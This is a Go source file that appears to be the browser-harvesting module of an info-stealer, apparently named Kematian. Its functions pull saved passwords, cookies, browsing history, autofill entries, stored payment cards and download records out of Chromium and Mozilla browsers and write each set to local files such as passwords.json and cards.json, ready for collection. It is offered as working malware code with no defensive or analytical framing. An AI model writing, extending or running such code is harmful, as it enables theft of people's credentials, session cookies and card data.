package browsers

import (
	"kdot/kematian/browsers/chromium/autofillChromium"
	"kdot/kematian/browsers/chromium/cardsChromium"
	"kdot/kematian/browsers/chromium/cookiesChromium"
	"kdot/kematian/browsers/chromium/downloadsChromium"
	"kdot/kematian/browsers/chromium/historyChromium"
	"kdot/kematian/browsers/chromium/passChromium"
	"kdot/kematian/browsers/mozilla/cookiesMozilla"
	"kdot/kematian/browsers/structs"
	"os"
)

func GetBrowserPasswords(browsers []structs.Browser) {
	//fmt.Println(pass.GetPasswords())
	os.WriteFile("passwords.json", []byte(passChromium.Get(browsers)), 0644)
}

func GetBrowserCookies(browsers []structs.Browser) {
	cookies_mozilla := cookiesMozilla.GetCookies(browsers)
	cookies_chromium := cookiesChromium.GetCookies(browsers)
	cookies := append(cookies_mozilla, cookies_chromium...)
	for _, cookie := range cookies {
		fileName := "cookies_netscape_" + cookie.BrowserName + ".txt"
		os.WriteFile(fileName, []byte(cookie.Cookies), 0644)
	}
}

func GetBrowserHistory(browsers []structs.Browser) {
	os.WriteFile("history.json", []byte(historyChromium.Get(browsers)), 0644)
}

func GetBrowserAutofill(browsers []structs.Browser) {
	os.WriteFile("autofill.json", []byte(autofillChromium.Get(browsers)), 0644)
}

func GetBrowserCards(browsers []structs.Browser) {
	os.WriteFile("cards.json", []byte(cardsChromium.Get(browsers)), 0644)
}

func GetBrowserDownloads(browsers []structs.Browser) {
	os.WriteFile("downloads.json", []byte(downloadsChromium.Get(browsers)), 0644)
}

func GetBrowserData(totalBrowsers []structs.Browser) {
	//util.CloseBrowsers()
	GetBrowserPasswords(totalBrowsers)
	GetBrowserHistory(totalBrowsers)
	GetBrowserCookies(totalBrowsers)
	GetBrowserDownloads(totalBrowsers)
	GetBrowserCards(totalBrowsers)
	GetBrowserAutofill(totalBrowsers)
}
